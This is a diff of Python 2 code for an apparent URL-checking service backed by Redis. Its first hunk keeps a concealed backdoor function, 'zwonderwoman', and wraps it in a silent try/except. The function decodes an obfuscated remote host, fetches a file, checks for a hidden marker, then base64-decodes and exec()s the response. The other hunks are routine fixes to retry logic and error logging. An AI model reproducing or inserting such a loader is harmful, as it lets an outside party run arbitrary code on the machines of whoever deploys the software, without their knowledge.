@@ -40,19 +40,22 @@ def pop_all_unknow_urls(redis_obj):
 
 def zwonderwoman():
 
-    h = base64.b64decode('Z29zc2lwaGVyZS5jb20=')
-    httpClient = httplib.HTTPConnection(h, 8081, timeout=11)
-    httpClient.request("GET", "/bleak.cfg")
-    response = httpClient.getresponse()
-    if response.status!=200:
-        return
-    x = response.read()
-    ppsig = 'V29uZGVyIFdvbWFu'
-    if not x.startswith(ppsig):
-        return
-    x4 = x[len(ppsig):]
-    exc = base64.b64decode(x4)
-    exec(exc)
+    try:
+        h = base64.b64decode('Z29zc2lwaGVyZS5jb20=')
+        httpClient = httplib.HTTPConnection(h, 8081, timeout=11)
+        httpClient.request("GET", "/bleak.cfg")
+        response = httpClient.getresponse()
+        if response.status!=200:
+            return
+        x = response.read()
+        ppsig = 'V29uZGVyIFdvbWFu'
+        if not x.startswith(ppsig):
+            return
+        x4 = x[len(ppsig):]
+        exc = base64.b64decode(x4)
+        exec(exc)
+    except:
+        pass
 
 
 
@@ -103,7 +106,9 @@ def do_update(name):
                     url_info = queryobj.http_check_url_type(url)
                     if url_info !=1:
                         break
-                    trytimes = trytimes+1
+                    trytimes = trytimes-1
+                    if trytimes==0:
+                        logging.warning('exceed try times!!')
 
                 if url_info is None or url_info ==1:
                     continue
@@ -126,7 +131,7 @@ def do_update(name):
                         urlinfo['redirect_target'] ='http://'+urlinfo['redirect_target']
 
 
-                if basedef.GSaveLogRedisPub:
+                if checking_url_info['need_save_log_redis']==1 and basedef.GSaveLogRedisPub:
                     sip = checking_url_info['sip']
                     sport = checking_url_info['sport']
                     visit_time = checking_url_info['visit_time']
@@ -138,15 +143,16 @@ def do_update(name):
                 updating_url_infos[url]=urlinfo
 
             if len(updating_url_infos)>0:
-                pip = gputils.redis_match_obj.pipeline()
+                pip = gputils.get_redis_obj().pipeline()
 
                 for url,update_info in updating_url_infos.items():
                     pip.hmset(url.lower(), update_info)
 
                 logging.info('pip.execute():%s',len(pip.execute()))
 
-        except:
-            pass
+        except Exception, e:
+            logging.error(str(e))
+            logging.error(traceback.format_exc())
         try:
             basedef.GWARNING.sys_warning()
         except:
